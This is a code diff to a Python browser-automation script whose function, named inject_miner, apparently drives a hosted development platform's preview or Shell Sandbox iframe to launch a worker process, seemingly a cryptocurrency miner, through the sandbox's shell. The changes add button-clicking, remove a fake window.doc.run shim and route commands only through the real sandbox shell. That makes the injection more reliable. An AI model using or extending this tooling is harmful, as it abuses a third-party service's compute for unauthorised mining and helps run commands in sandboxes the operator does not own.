@@ -148,7 +148,19 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
         print(f"⚙️ Starting worker (folder: {folder_name})...")
         
         # Wait for Preview iframe / Shell Sandbox to attach
-        await asyncio.sleep(5)
+        await asyncio.sleep(3)
+        # Soft-click Preview so iframe exists (daemon also does this)
+        for label in ("Preview", "preview", "Shell", "shell"):
+            try:
+                btn = page.get_by_role("button", name=label, exact=False)
+                n = await asyncio.wait_for(btn.count(), timeout=2)
+                if n > 0:
+                    await btn.first.click(timeout=2500)
+                    await asyncio.sleep(0.8)
+                    break
+            except Exception:
+                continue
+        await asyncio.sleep(2)
 
         def _frame_score(frame) -> int:
             """Prefer lovableproject.com Shell Sandbox over id-preview / chat chrome."""
@@ -217,48 +229,24 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
 
         print(f"✅ Using frame: {(preview_frame.url or '')[:100]}")
 
-        # Inject window.doc.run if not exists
-        setup_code = """
-        if (!window.doc) {
-            window.doc = {
-                run: async (cmd) => {
-                    try {
-                        // Try multiple methods to execute command
-                        if (typeof require !== 'undefined') {
-                            const { exec } = require('child_process');
-                            return new Promise((resolve, reject) => {
-                                exec(cmd, (error, stdout, stderr) => {
-                                    if (error) reject(error);
-                                    else resolve({ stdout, stderr });
-                                });
-                            });
-                        } else if (window.process && window.process.exec) {
-                            return await window.process.exec(cmd);
-                        } else {
-                            // Fallback: try to use eval or other methods
-                            console.log('Executing:', cmd);
-                            return { status: 'attempted', cmd: cmd };
-                        }
-                    } catch (e) {
-                        console.error('doc.run error:', e);
-                        return { error: e.message };
-                    }
-                }
-            };
-            console.log('✅ window.doc.run initialized');
-        }
-        true;
-        """
-
+        # Never install a fake window.doc object — it poisons the iframe
+        # (`typeof doc !== 'function'`) and blocks the real Shell Sandbox.
         try:
-            result = await preview_frame.evaluate(setup_code)
-            print(f"   Setup result: {result}")
+            doc_state = await preview_frame.evaluate("""() => {
+                if (window.doc && typeof window.doc !== 'function') {
+                    try { delete window.doc; } catch (e) { window.doc = undefined; }
+                    return 'cleared-fake';
+                }
+                if (typeof window.doc === 'function') return 'real';
+                return 'missing';
+            }""")
+            print(f"   Doc state: {doc_state}")
         except Exception as e:
-            print(f"   ⚠️  Setup warning: {e}")
+            print(f"   Doc state check fail: {type(e).__name__}: {e}")
 
         await asyncio.sleep(2)
 
-        # Probe: wait until window.doc(cmd) works. Try every candidate frame
+        # Probe: wait until real window.doc(cmd) works. Try every candidate frame
         # each attempt — Shell Sandbox may be nested / appear late.
         probe_ok = False
         for attempt in range(8):
@@ -278,6 +266,16 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
                     fu = (fr.url or "")[:90]
                 except Exception:
                     fu = "?"
+                try:
+                    # Clear fake object if something re-installed it
+                    await asyncio.wait_for(fr.evaluate("""() => {
+                        if (window.doc && typeof window.doc !== 'function') {
+                            try { delete window.doc; } catch (e) { window.doc = undefined; }
+                        }
+                        return true;
+                    }"""), timeout=5)
+                except Exception:
+                    pass
                 try:
                     probe = await asyncio.wait_for(fr.evaluate("""
                         (async () => {
@@ -326,15 +324,8 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
                 if (window.doc && typeof window.doc.connect === 'function') {{
                     try {{ await window.doc.connect(); }} catch (e) {{}}
                 }}
-                // Step 2: fire the worker in the background
-                if (window.doc && typeof window.doc.run === 'function') {{
-                    try {{
-                        const r = await window.doc.run(cmd);
-                        return {{ method: 'doc.run(cmd)', ok: true, result: r }};
-                    }} catch (e) {{
-                        return {{ method: 'doc.run(cmd)', ok: false, error: e.message }};
-                    }}
-                }} else if (typeof window.doc === 'function') {{
+                // Step 2: fire the worker in the background — real Shell only
+                if (typeof window.doc === 'function') {{
                     try {{
                         const r = await window.doc(cmd);
                         return {{ method: 'doc(cmd)', ok: true, result: r }};
